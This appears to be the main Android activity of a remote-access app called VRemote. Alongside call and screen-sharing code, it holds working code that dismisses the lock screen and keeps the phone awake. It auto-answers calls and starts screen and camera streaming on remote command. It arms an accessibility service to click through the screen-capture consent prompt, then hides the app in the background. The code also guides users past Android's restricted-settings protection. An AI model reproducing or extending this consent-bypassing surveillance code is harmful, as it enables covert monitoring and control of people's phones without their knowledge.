package com.tokendeal.vremote;

import android.Manifest;
import android.app.Activity;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.app.PictureInPictureParams;
import android.app.RemoteAction;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.drawable.Icon;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.Rational;
import android.view.WindowManager;
import android.webkit.*;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.webrtc.VideoTrack;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity implements WebRTCCompanion.Callback {

    private static final String TAG = "VRemoteMain";
    private static final int REQUEST_SCREEN_CAPTURE = 1001;
    private static final int REQUEST_PERMISSIONS = 2001;
    private static final String APP_URL = "https://v.tokendeal.cloud";

    private static MainActivity sInstance = null;
    public static MainActivity getInstance() { return sInstance; }
    public WebRTCCompanion getWebRTCCompanion() { return webRTCCompanion; }

    private WebView webView;
    private MediaProjectionManager projectionManager;
    private Intent captureIntentData = null;
    private WebRTCCompanion webRTCCompanion = null;
    private android.os.PowerManager.WakeLock wakeLock = null;

    private String pendingTargetPeer = "";
    private boolean isFullControlEnabled = true;
    private boolean streamCompanionCamera = true;
    private String companionCameraChoice = "front";
    private boolean isCallActive = false;
    private boolean hasPromptedAccessibility = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sInstance = this;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
            KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            if (km != null) {
                km.requestDismissKeyguard(this, null);
            }
        } else {
            getWindow().addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            );
        }
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        setContentView(R.layout.activity_main);

        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "VRemote::WakeLock");
                wakeLock.acquire(12 * 60 * 60 * 1000L /* 12 hours */);
            }
        } catch (Exception ignored) {}

        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        // Start 24/7 background companion service immediately
        BackgroundKeepAliveService.startService(this);

        requestAppPermissions();
        initWebRTC();
        initWebView();
        handleAutoCommandIntent(getIntent());

        // Enqueue 30-minute WorkManager keep-alive worker to support all devices even when app is stopped
        KeepAliveScheduler.schedulePeriodicWork(this);
    }

    private void requestAppPermissions() {
        List<String> permList = new ArrayList<>();
        permList.add(Manifest.permission.CAMERA);
        permList.add(Manifest.permission.RECORD_AUDIO);
        permList.add(Manifest.permission.MODIFY_AUDIO_SETTINGS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permList.add(Manifest.permission.READ_MEDIA_IMAGES);
            permList.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            permList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        List<String> needed = new ArrayList<>();
        for (String perm : permList) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                needed.add(perm);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQUEST_PERMISSIONS);
        }
    }

    private void initWebView() {
        webView = findViewById(R.id.webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setMediaPlaybackRequiresUserGesture(false);
        settings.setAllowFileAccess(true);
        settings.setAllowContentAccess(true);
        settings.setLoadsImagesAutomatically(true);
        settings.setUseWideViewPort(true);
        settings.setLoadWithOverviewMode(true);
        settings.setSupportZoom(false);
        settings.setBuiltInZoomControls(false);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        }

        webView.clearCache(true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                Uri uri = request.getUrl();
                if (uri != null && "vremote".equalsIgnoreCase(uri.getScheme())) {
                    return true;
                }
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.i(TAG, "WebView loaded page: " + url);
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public Bitmap getDefaultVideoPoster() {
                // Return 1x1 blank transparent bitmap so Android never renders the default play icon thumbnail
                return Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888);
            }

            @Override
            public void onPermissionRequest(final PermissionRequest request) {
                runOnUiThread(() -> {
                    Log.i(TAG, "Granting WebRTC permissions to WebView: " + java.util.Arrays.toString(request.getResources()));
                    request.grant(request.getResources());
                });
            }
        });

        // Add Native Android Bridge for Screen Capture & Remote Control
        webView.addJavascriptInterface(new NativeAppBridge(), "VRemoteNative");

        // Fresh load with cache-buster parameter to ensure WebView always renders latest features
        String appLoadUrl = APP_URL + "/?v=" + System.currentTimeMillis();
        webView.loadUrl(appLoadUrl);
    }

    private void initWebRTC() {
        webRTCCompanion = new WebRTCCompanion(this, APP_URL, DeviceRegistry.getDeviceId(this), this);
    }

    public void startScreenCaptureWithCamera(String targetPeer, boolean fullControl, boolean streamCamera, String cameraChoice) {
        pendingTargetPeer = (targetPeer != null && !targetPeer.isEmpty()) ? targetPeer : "";
        isFullControlEnabled = fullControl;
        streamCompanionCamera = streamCamera;
        companionCameraChoice = (cameraChoice != null) ? cameraChoice : "front";

        if (webRTCCompanion != null) {
            webRTCCompanion.setFullControlEnabled(fullControl);
        }

        runOnUiThread(() -> {
            if (captureIntentData != null) {
                Log.i(TAG, "Reusing existing MediaProjection capture token");
                startScreenStreaming();
                return;
            }

            // Arm accessibility service to auto-click "Start now" without manual phone interaction
            RemoteAccessibilityService.setAutoAcceptPending(true);

            if (projectionManager != null) {
                startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_SCREEN_CAPTURE);
            }
        });
    }

    public class NativeAppBridge {
        @JavascriptInterface
        public boolean isNativeApp() {
            return true;
        }

        @JavascriptInterface
        public boolean isAccessibilityRunning() {
            return RemoteAccessibilityService.isServiceRunning();
        }

        @JavascriptInterface
        public void openAccessibilitySettings() {
            runOnUiThread(() -> {
                Toast.makeText(MainActivity.this, "Find 'VRemote Screen Share' and switch it ON", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                startActivity(intent);
            });
        }

        @JavascriptInterface
        public void setCallActive(boolean active) {
            MainActivity.this.isCallActive = active;
        }

        @JavascriptInterface
        public void startScreenCapture(String targetPeer, boolean fullControl) {
            MainActivity.this.startScreenCaptureWithCamera(targetPeer, fullControl, true, "front");
        }

        @JavascriptInterface
        public void startScreenCaptureWithCamera(String targetPeer, boolean fullControl, boolean streamCamera, String cameraChoice) {
            MainActivity.this.startScreenCaptureWithCamera(targetPeer, fullControl, streamCamera, cameraChoice);
        }

        @JavascriptInterface
        public void enterPip() {
            runOnUiThread(MainActivity.this::enterWhatsAppStylePipOrBack);
        }

        @JavascriptInterface
        public void stopScreenCapture() {
            runOnUiThread(() -> {
                if (webRTCCompanion != null) {
                    webRTCCompanion.endCall(true);
                }
                Intent serviceIntent = new Intent(MainActivity.this, ScreenCaptureService.class);
                stopService(serviceIntent);
                Toast.makeText(MainActivity.this, "Screen sharing stopped", Toast.LENGTH_SHORT).show();
            });
        }

        @JavascriptInterface
        public void setMyId(String newId) {
            if (webRTCCompanion != null && newId != null) {
                webRTCCompanion.setMyId(newId);
            }
        }

        @JavascriptInterface
        public void setSpeakerphone(boolean loud) {
            runOnUiThread(() -> {
                try {
                    android.media.AudioManager am = (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    if (am != null) {
                        am.setMode(android.media.AudioManager.MODE_IN_COMMUNICATION);
                        am.setSpeakerphoneOn(loud);
                        Log.i(TAG, "Audio routed via JS bridge: speakerphone=" + loud);
                    }
                } catch (Exception ignored) {}
            });
        }

        @JavascriptInterface
        public String getDeviceId() {
            return DeviceRegistry.getDeviceId(MainActivity.this);
        }

        @JavascriptInterface
        public String getDeviceInfo() {
            try {
                org.json.JSONObject info = new org.json.JSONObject();
                info.put("deviceId", DeviceRegistry.getDeviceId(MainActivity.this));
                info.put("deviceName", DeviceRegistry.getDeviceModel());
                info.put("ram", DeviceRegistry.getDeviceRam(MainActivity.this));
                info.put("platform", "android");
                return info.toString();
            } catch (Exception e) {
                return "{}";
            }
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        }
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        if (intent != null && "ACTION_STOP_SHARE".equals(intent.getAction())) {
            stopAllMediaAndFinish();
            Toast.makeText(this, "Screen sharing stopped", Toast.LENGTH_SHORT).show();
            return;
        }
        handleAutoCommandIntent(intent);
    }

    private long lastAutoCmdTime = 0;
    private String pendingAutoCommand = null;
    private String pendingCaller = null;
    private String pendingCamChoice = null;

    private void handleAutoCommandIntent(Intent intent) {
        if (intent == null) return;
        String autoCmd = intent.getStringExtra("auto_command");
        String caller = intent.getStringExtra("caller");
        String camChoice = intent.getStringExtra("cameraChoice");
        if (autoCmd == null || autoCmd.isEmpty()) return;

        long now = System.currentTimeMillis();
        if (now - lastAutoCmdTime < 2000 && autoCmd.equals(pendingAutoCommand)) {
            Log.w(TAG, "Ignoring duplicate auto_command within 2s: " + autoCmd);
            return;
        }
        lastAutoCmdTime = now;
        intent.removeExtra("auto_command");

        Log.i(TAG, "Handling auto_command: " + autoCmd + " from " + caller);
        pendingAutoCommand = autoCmd;
        pendingCaller = (caller != null && !caller.isEmpty()) ? caller : "";
        pendingCamChoice = (camChoice != null && !camChoice.isEmpty()) ? camChoice : "front";

        if (webRTCCompanion == null) {
            initWebRTC();
        }

        if (webRTCCompanion != null && webRTCCompanion.isSocketConnected()) {
            executePendingAutoCommand();
        } else {
            Log.i(TAG, "webRTCCompanion not connected yet, waiting for onConnected callback...");
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(this::executePendingAutoCommand, 2000);
        }
    }

    private synchronized void executePendingAutoCommand() {
        if (pendingAutoCommand == null) return;
        if (webRTCCompanion == null) {
            initWebRTC();
            return;
        }

        String autoCmd = pendingAutoCommand;
        String caller = pendingCaller;
        String camChoice = pendingCamChoice;
        pendingAutoCommand = null;

        Log.i(TAG, "Executing pending auto_command: " + autoCmd + " for caller: " + caller);
        switch (autoCmd) {
            case "audio_call":
                webRTCCompanion.startAudioCall(caller);
                runOnUiThread(() -> moveTaskToBack(true));
                break;
            case "video_call":
                webRTCCompanion.startVideoCall(caller);
                runOnUiThread(() -> moveTaskToBack(true));
                break;
            case "screen_share":
                startScreenCaptureWithCamera(caller, false, !"none".equalsIgnoreCase(camChoice), camChoice);
                break;
            case "screen_share_control":
                startScreenCaptureWithCamera(caller, true, !"none".equalsIgnoreCase(camChoice), camChoice);
                break;
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                captureIntentData = data;
                startScreenStreaming();
            } else {
                Toast.makeText(this, "Screen capture was cancelled", Toast.LENGTH_SHORT).show();
                if (webRTCCompanion != null) {
                    webRTCCompanion.emitDeviceError("Screen capture permission was cancelled on phone");
                }
            }
        }
    }

    private void startScreenStreaming() {
        ScreenCaptureService.setOnForegroundStartedListener(() -> {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            getWindowManager().getDefaultDisplay().getRealMetrics(displayMetrics);

            if (webRTCCompanion != null) {
                webRTCCompanion.startScreenShare(
                        pendingTargetPeer,
                        captureIntentData,
                        displayMetrics.widthPixels,
                        displayMetrics.heightPixels,
                        streamCompanionCamera,
                        companionCameraChoice
                );
            }

            // Immediately send application to background so phone stays on desktop/other apps
            runOnUiThread(() -> {
                moveTaskToBack(true);
            });
        });

        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    public void enterWhatsAppStylePipOrBack() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                PictureInPictureParams.Builder pipBuilder = new PictureInPictureParams.Builder();
                pipBuilder.setAspectRatio(new Rational(9, 16));

                ArrayList<RemoteAction> actions = new ArrayList<>();
                Intent endIntent = new Intent(this, MainActivity.class);
                endIntent.setAction("ACTION_STOP_SHARE");
                PendingIntent endPi = PendingIntent.getActivity(
                        this, 101, endIntent,
                        PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
                );
                Icon endIcon = Icon.createWithResource(this, android.R.drawable.ic_menu_close_clear_cancel);
                RemoteAction endAction = new RemoteAction(endIcon, "Stop Share", "End Screen Sharing", endPi);
                actions.add(endAction);
                pipBuilder.setActions(actions);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    pipBuilder.setAutoEnterEnabled(false);
                    pipBuilder.setSeamlessResizeEnabled(true);
                }
                boolean entered = enterPictureInPictureMode(pipBuilder.build());
                if (entered) {
                    return;
                }
            } catch (Exception e) {
                Log.w(TAG, "PictureInPicture not supported or failed: " + e.getMessage());
            }
        }
        moveTaskToBack(true);
    }

    @Override
    public void onUserLeaveHint() {
        super.onUserLeaveHint();
        // Strict manual-only PiP: Do NOT enter PiP automatically on home button press.
        // PiP is only entered when user explicitly clicks the PiP option in More menu.
    }

    @Override
    public void onPictureInPictureModeChanged(boolean isInPictureInPictureMode, Configuration newConfig) {
        super.onPictureInPictureModeChanged(isInPictureInPictureMode, newConfig);
        if (isInPictureInPictureMode) {
            if (webView != null) {
                webView.resumeTimers();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) {
            webView.onResume();
            webView.resumeTimers();
        }
        BackgroundKeepAliveService.startService(this);
        checkAccessibilityPrompt();
    }

    private void checkAccessibilityPrompt() {
        if (hasPromptedAccessibility) return;
        if (!RemoteAccessibilityService.isServiceRunning()) {
            hasPromptedAccessibility = true;
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    if (isFinishing() || isDestroyed()) return;
                    new androidx.appcompat.app.AlertDialog.Builder(this)
                            .setTitle("Enable Background Remote Control")
                            .setMessage("To enable remote touch control and auto screen share without touching this phone, please turn ON 'VRemote Screen Share' in Accessibility Settings.\n\n(If your phone shows 'Restricted setting', go to Settings > Apps > VRemote > tap 3 dots in top right > tap 'Allow restricted settings' first).")
                            .setPositiveButton("Open Settings", (dialog, which) -> {
                                try {
                                    Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                                    startActivity(intent);
                                } catch (Exception ignored) {}
                            })
                            .setNegativeButton("Later", null)
                            .setCancelable(true)
                            .show();
                } catch (Exception ignored) {}
            }, 1200);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        // Keep WebView execution active when backgrounded for screen capture
        if (webView != null) {
            webView.resumeTimers();
        }
    }

    // WebRTCCompanion callbacks
    @Override public void onConnected(String myId) {
        Log.i(TAG, "WebRTCCompanion connected as: " + myId);
        runOnUiThread(this::executePendingAutoCommand);
    }
    @Override public void onStatusChanged(String status, boolean isLive) {}
    @Override public void onParticipantsList(List<String> users) {}
    @Override public void onIncomingCall(String fromUser, String callType) {
        runOnUiThread(() -> {
            Log.i(TAG, "Incoming call to companion from: " + fromUser + ", auto-answering");
            if (webRTCCompanion != null) {
                webRTCCompanion.acceptIncomingCall();
            }
        });
    }
    @Override public void onRemoteVideoTrack(VideoTrack track) {}
    @Override public void onCallEnded() {
        runOnUiThread(() -> {
            stopAllMediaAndFinish();
        });
    }
    @Override public void onError(String error) {
        runOnUiThread(() -> {
            Toast.makeText(this, error, Toast.LENGTH_SHORT).show();
            if (webRTCCompanion != null) {
                webRTCCompanion.emitDeviceError(error);
            }
        });
    }
    @Override public void onAutoScreenShareRequest(String fromUser, boolean fullControl, boolean streamCamera, String cameraChoice) {
        runOnUiThread(() -> {
            Log.i(TAG, "Auto screen share request from: " + fromUser + " (fullControl=" + fullControl + ", cam=" + cameraChoice + ")");
            startScreenCaptureWithCamera(fromUser, fullControl, streamCamera, cameraChoice);
        });
    }

    public void stopAllMediaAndFinish() {
        Log.i(TAG, "stopAllMediaAndFinish: Releasing all cameras, mics, services and hiding activity to background");
        captureIntentData = null;
        pendingAutoCommand = null;
        lastAutoCmdTime = 0;

        try {
            Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
            stopService(serviceIntent);
        } catch (Exception ignored) {}

        if (webRTCCompanion != null) {
            try {
                webRTCCompanion.endCall(false);
            } catch (Exception ignored) {}
        }

        runOnUiThread(() -> {
            try {
                moveTaskToBack(true);
            } catch (Exception ignored) {}
        });
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            // Push activity to background instead of destroying, keeping session ready
            try {
                moveTaskToBack(true);
            } catch (Exception e) {
                super.onBackPressed();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (sInstance == this) {
            sInstance = null;
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            try { wakeLock.release(); } catch (Exception ignored) {}
            wakeLock = null;
        }
        if (webRTCCompanion != null) {
            webRTCCompanion.destroy();
            webRTCCompanion = null;
        }
        if (webView != null) {
            webView.destroy();
            webView = null;
        }
    }
}
